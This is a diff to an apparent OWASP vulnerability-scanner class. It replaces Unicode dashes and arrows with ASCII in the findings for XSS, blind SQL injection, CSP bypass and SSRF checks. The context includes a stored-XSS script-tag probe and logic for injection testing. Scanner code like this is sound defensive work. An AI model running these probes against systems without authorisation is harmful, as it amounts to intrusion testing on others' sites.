@@ -1686,7 +1686,7 @@ class OWASPChecker:
                 pass
 
     def _dom_xss(self, resp):
-        """DOM-based XSS — detect dangerous source→sink patterns in JS."""
+        """DOM-based XSS - detect dangerous source->sink patterns in JS."""
         print("[XSS-DOM] DOM XSS Analysis...")
         html = resp.text
 
@@ -1696,7 +1696,7 @@ class OWASPChecker:
         if found_sources and found_sinks:
             self._add(
                 "A05:2025", "Injection", "HIGH",
-                "DOM-Based XSS (Source→Sink Pattern)",
+                "DOM-Based XSS (Source->Sink Pattern)",
                 "Page JavaScript reads from DOM sources and writes to dangerous sinks. "
                 "If user-controlled data flows from source to sink without sanitization, "
                 "DOM XSS is exploitable entirely client-side (no server reflection needed).",
@@ -1714,7 +1714,7 @@ class OWASPChecker:
             )
 
     def _stored_xss_check(self):
-        """Stored XSS — submit payload then retrieve it."""
+        """Stored XSS - submit payload then retrieve it."""
         print("[XSS-Stored] Stored XSS...")
         marker = "<script>alert('cybrain_stored_xss')</script>"
 
@@ -1744,10 +1744,10 @@ class OWASPChecker:
                     if r2 and marker in r2.text:
                         self._add(
                             "A05:2025", "Injection", "CRITICAL",
-                            f"Stored XSS — {path}",
+                            f"Stored XSS - {path}",
                             f"XSS payload stored at {path} and reflected at {read_path}. "
                             "Affects ALL users viewing this content.",
-                            evidence=f"POST {path} payload stored → GET {read_path} reflects it",
+                            evidence=f"POST {path} payload stored -> GET {read_path} reflects it",
                             fix=(
                                 "1. HTML-encode all user-generated content on output.\n"
                                 "2. Sanitize on input AND output.\n"
@@ -1787,15 +1787,15 @@ class OWASPChecker:
         jsonp_cdns = ["ajax.googleapis.com", "cdn.jsdelivr.net", "cdnjs.cloudflare.com"]
         for cdn in jsonp_cdns:
             if cdn in csp:
-                bypass_indicators.append(f"Trusted CDN {cdn} may host JSONP — CSP bypass possible")
+                bypass_indicators.append(f"Trusted CDN {cdn} may host JSONP - CSP bypass possible")
                 break
 
         if bypass_indicators:
             self._add(
                 "A02:2025", "Security Misconfiguration", "MEDIUM",
                 "Content-Security-Policy Bypass Vectors",
-                "CSP is present but contains weaknesses that allow bypass:\n• "
-                + "\n• ".join(bypass_indicators),
+                "CSP is present but contains weaknesses that allow bypass:\n* "
+                + "\n* ".join(bypass_indicators),
                 evidence=f"CSP: {csp[:200]}",
                 fix=(
                     "1. Remove 'unsafe-inline' and 'unsafe-eval'.\n"
@@ -1807,7 +1807,7 @@ class OWASPChecker:
             )
 
     def _sqli_boolean(self):
-        """SQL Injection — boolean-based blind detection."""
+        """SQL Injection - boolean-based blind detection."""
         print("[SQLi-Boolean] Boolean-Based Blind SQLi...")
         params_to_test = list(set([
             "id","user","username","q","search","page","cat","item"
@@ -1828,13 +1828,13 @@ class OWASPChecker:
                         r_false.status_code == 200):
                     self._add(
                         "A05:2025", "Injection", "CRITICAL",
-                        "SQL Injection — Boolean-Based Blind",
+                        "SQL Injection - Boolean-Based Blind",
                         f"Boolean SQLi via '{param}'. True condition returns "
                         f"{len(r_true.text)}b, false returns {len(r_false.text)}b "
                         f"(diff={diff}b). Full DB extraction possible with sqlmap.",
                         evidence=(
-                            f"?{param}={true_pl} → {len(r_true.text)}b | "
-                            f"?{param}={false_pl} → {len(r_false.text)}b"
+                            f"?{param}={true_pl} -> {len(r_true.text)}b | "
+                            f"?{param}={false_pl} -> {len(r_false.text)}b"
                         ),
                         fix=(
                             "1. Use parameterized queries exclusively.\n"
@@ -1846,7 +1846,7 @@ class OWASPChecker:
                     return
 
     def _sqli_time_based(self):
-        """SQL Injection — time-based blind detection."""
+        """SQL Injection - time-based blind detection."""
         print("[SQLi-Time] Time-Based Blind SQLi...")
         params_to_test = list(set([
             "id","user","username","q","search","page","cat"
@@ -1861,13 +1861,13 @@ class OWASPChecker:
                 if r and elapsed >= delay:
                     self._add(
                         "A05:2025", "Injection", "CRITICAL",
-                        "SQL Injection — Time-Based Blind",
+                        "SQL Injection - Time-Based Blind",
                         f"Time-based SQLi via '{param}' ({description}). "
-                        f"Response delayed {elapsed:.1f}s (expected ≥{delay}s). "
+                        f"Response delayed {elapsed:.1f}s (expected ?{delay}s). "
                         "DB contents extractable character by character.",
                         evidence=(
                             f"?{param}={payload[:50]} "
-                            f"→ response in {elapsed:.1f}s"
+                            f"-> response in {elapsed:.1f}s"
                         ),
                         fix=(
                             "1. Use parameterized queries exclusively.\n"
@@ -1879,7 +1879,7 @@ class OWASPChecker:
                     return
 
     def _ssrf_extended(self):
-        """Extended SSRF — cloud metadata, DNS rebind, all internal ranges."""
+        """Extended SSRF - cloud metadata, DNS rebind, all internal ranges."""
         print("[SSRF-Extended] Cloud metadata + DNS rebind...")
 
         for param in SSRF_PARAMS:
@@ -1890,9 +1890,9 @@ class OWASPChecker:
                 if r and any(s in r.text.lower() for s in SSRF_SIGNS):
                     self._add(
                         "A10:2025", "Mishandling of Exceptional Conditions", "CRITICAL",
-                        "SSRF — Cloud Metadata / Internal Network",
+                        "SSRF - Cloud Metadata / Internal Network",
                         f"SSRF via '{param}' reached internal resource ({payload}).",
-                        evidence=f"?{param}={payload} → internal/metadata response",
+                        evidence=f"?{param}={payload} -> internal/metadata response",
                         fix=(
                             "1. Validate URLs against strict allowlist.\n"
                             "2. Block private IP ranges at network level.\n"
@@ -1910,7 +1910,7 @@ class OWASPChecker:
                         "A10:2025", "Mishandling of Exceptional Conditions", "CRITICAL",
                         "SSRF via POST Parameter",
                         f"SSRF via POST '{param}'. Internal network accessible.",
-                        evidence=f"POST {param}={payload} → internal response",
+                        evidence=f"POST {param}={payload} -> internal response",
                         fix="Validate all user-supplied URLs. Block private IPs at network level.",
                         cwe="CWE-918", cvss="9.8"
                     )
